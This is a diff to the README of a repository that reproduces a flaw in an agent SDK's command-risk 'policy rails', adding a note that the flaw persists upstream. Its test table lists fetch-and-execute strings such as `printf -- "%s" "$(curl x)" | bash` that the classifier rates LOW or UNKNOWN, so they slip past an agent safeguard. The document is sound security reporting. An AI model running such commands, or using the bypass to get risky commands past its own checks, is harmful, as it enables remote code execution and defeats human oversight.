@@ -73,6 +73,12 @@ uv run pytest tests/sdk/security/defense_in_depth/test_policy_rails_reproduction
 | `test_repro_printf_end_of_options_substitution_forwarded_to_jq` | `printf -- "%s" "$(curl x)" \| jq .` | `HIGH` (`fetch-to-exec`) | `LOW` (`None`) | **FAIL (repro)** |
 | `test_repro_printf_end_of_options_substitution_forwarded_to_bash` | `printf -- "%s" "$(curl x)" \| bash` | `HIGH` (`fetch-to-exec`) | `UNKNOWN` (`None`) | **FAIL (repro)** |
 
+## Upstream Status (checked 2026-11-19)
+
+Source reading only; the tests were not re-run against `main`.
+
+- On `main` at `4f236d7`, `_forwards_substitution()` in `policy_rails.py` still returns `False` for `argument_index == 0` and still reads `direct_command.arguments[0]` as the format string without skipping `--`.
+
 ## Sanitization Note
 
 Machine-specific local checkout paths in `evidence/*.log` were replaced with `<workspace>/software-agent-sdk`. No assertions, stack frames, or test outcomes were modified.
@@ -80,5 +86,7 @@ Machine-specific local checkout paths in `evidence/*.log` were replaced with `<w
 ## Scope
 
 This repository contains reproduction tests and execution logs only. No production fix is included.
+
+This repository's own content is MIT licensed ([LICENSE](LICENSE)). Upstream license and attribution: see [NOTICE](NOTICE).
 
 Prepared with AI assistance. The reported tests were executed locally against commit `641e161178cb934f38afcbe603125950611d1668`.
